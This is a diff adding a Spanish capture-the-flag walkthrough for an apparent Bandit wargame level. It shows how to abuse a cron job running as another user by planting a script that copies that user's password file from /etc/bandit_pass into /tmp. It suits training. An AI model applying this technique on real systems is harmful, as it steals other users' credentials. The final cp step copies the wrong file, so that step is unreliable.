@@ -404,3 +404,52 @@ cat /tmp/[hash_calculado]
 ```
 
 [**EXTRAS**](./bandit_extra.md#nivel-22-a-nivel-23)
+
+## Nivel 23 a Nivel 24
+**Objetivo:**  interpretar un archivo *cron* y analizar el comando que ejecuta.
+
+Al igual que en ejercicios anteriores se lee el archivo que esta siendo ejecutado de forma regular.
+
+```bash
+ls /etc/cron.d
+cat /etc/cron.d/cronjob_bandit24
+cat [archivo_que_vemos_en_cronjob]
+```
+
+De esta forma podemos leer el script y lo que hace.
+
+El script se encarga de ejecutar y borrar todos los archivos contenidos en cierto directorio. Esto lo hace con los permisos de *bandit24*.
+
+Al intentar entrar al escritorio no nos es permitido por falta de permisos. Por lo que revisamos los permisos que tiene y vemos que se nos permite escribir y ejecutar dentro del directorio pero no leer. 
+
+```bash
+ls -ld [directorio_que_vemos_en_cript]
+```
+
+Por lo que el objetivo del desafío se convierte en crear un script `.sh` que nos permita abusar de los permisos de *bandit24* para acceder a la contraseña ubicada en (como aprendimos en el **Nivel 19**) `/etc/bandit_pass/[usuario]`.
+
+Primero, creamos un directorio en `/tmp/` donde poder trabajar y crear nuestro script, luego con el comando `cat` creamos el archivo (en este caso es posible por ser un script corto).
+
+```bash
+cat > script_nuestro.sh 
+```
+
+Luego, el cursos se quedara esperando y podremos escribir nuestro script:
+
+```bash
+#!/bin/bash
+myname=$(whoami) # Medio innecesario pero queria dejarlo generico para el futuro
+cat /etc/bandit_pass/$myname > /tmp/[directorio_temporal]/password
+```
+
+Finalmente, damos permisos de ejecución y copiamos con `cp` nuestro archivo en el directorio mencionado y esperamos a que *bandit24* lo ejecute.
+
+```bash
+chmod 777 script_nuestro.sh 
+chmod 777 /[directorio_temporal]/
+cp /tmp/[directorio_temporal]/password [directorio_en_script]
+```
+
+Luego de un minuto el archivo `password` será creado y podrá ser leído.
+
+[**EXTRAS**](./bandit_extra.md#nivel-23-a-nivel-24)
